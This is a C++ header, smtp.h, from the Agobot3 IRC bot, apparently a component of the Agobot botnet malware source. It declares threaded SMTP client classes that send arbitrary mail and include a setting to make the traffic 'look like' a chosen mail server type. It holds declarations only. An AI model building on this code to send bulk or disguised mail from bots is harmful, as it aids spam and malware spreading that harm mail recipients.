/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef __SMTP_H__
#define __SMTP_H__

#include "cstring.h"
#include "cthread.h"
#include "sockets.h"

#define SMTP_DEFAULT_PORT 25

class CSMTP_Sender;
class CSMTP_Connection;

#define MTA_TYPE_UNKNOWN	0
#define MTA_TYPE_EXIM		1
#define MTA_TYPE_SENDMAIL	2
#define MTA_TYPE_QMAIL		3
#define MTA_TYPE_GAIA		4
#define MTA_TYPE_MSSMTPSVC	5
#define MTA_TYPE_MSEXCHANGE	6
#define MTA_TYPE_HOTMAILWM	7
#define MTA_TYPE_WEBMAIL	8
#define MTA_TYPE_POSTFIX	9
#define MTA_TYPE_SMTPD		10
#define MTA_TYPE_LIST_AMIRC	11

class CSMTP_Connection
{
public:
						 CSMTP_Connection();						// Constructor
	virtual				~CSMTP_Connection();						// Destructor

	void				 Init();									// Initialize connection object
																	// Connect to the server
	bool				 Connect(	CString sHost,					// The server address to connect to
									int iPort=SMTP_DEFAULT_PORT);	// The server port to connect to
	bool				 Disconnect();								// Disconnect from the server
	bool				 Hello();									// Send EHLO/HELO to the server
																	// Send a mail
	bool				 Mail(		CString sMailFrom,				// Senders email address
									CString sMailFromFull,			// Senders full name
									CString sRcptTo,				// Receipients email address
									CString sSubject,				// Subject
									CString sData);					// Data to send in the mail
	void				 SetMTA(	int iMTAType);					// Set the MTA type to the one specified

	CString				 m_sServerHost;								// The server address
	int					 m_iServerPort;								// The server port
	CSocket				 m_sServerSocket;							// The socket connected to the server
	bool				 m_bConnected;								// Is the class connected ?
	bool				 m_bUseSMTPExt;								// Use extended SMTP commands ?
	int					 m_iMTAType;								// Make it look like this MTA
};

class CSMTP_Sender : public CThread
{
public:
						 CSMTP_Sender();							// Constructor
	virtual				~CSMTP_Sender();							// Destructor
	virtual void		*Run();										// Override for thread function

	void				 SetMail(	CString sMailFrom,				// Senders email address
									CString sMailFromFull,			// Senders full name
									CString sRcptTo,				// Receipients email address
									CString sSubject,				// Subject
									CString sData);					// Data to send in the mail

	void				 SetServer(	CString sHost,					// The host to connect to
									int iPort);						// The port to connect to

	bool				 m_bFinished;
private:
	CString				 m_sMailFrom;
	CString				 m_sMailFromFull;
	CString				 m_sRcptTo;
	CString				 m_sSubject;
	CString				 m_sData;
	CString				 m_sHost;
	int					 m_iPort;
	CSMTP_Connection	 m_cConnection;
};

#endif // __SMTP_H__
